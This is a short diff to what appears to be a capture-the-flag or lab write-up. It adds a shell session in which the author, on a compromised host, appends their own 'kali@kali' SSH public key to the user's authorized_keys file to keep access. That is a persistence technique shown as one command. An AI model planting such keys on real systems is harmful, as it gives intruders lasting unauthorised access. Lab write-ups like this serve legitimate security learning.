@@ -398,7 +398,12 @@ spencer@ip-10-0-20-19:~$
 
 Looks like there is another connected machine here
 
+```python
+spencer@ip-10-0-20-19:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILuuc9ATXHZHzfDtAGfyx8CYDisCFp75E/floQfhjq4J kali@kali' >> authorized_keys 
+spencer@ip-10-0-20-19:~/.ssh$
+```
 
+Ill echo my public key
 
 
 
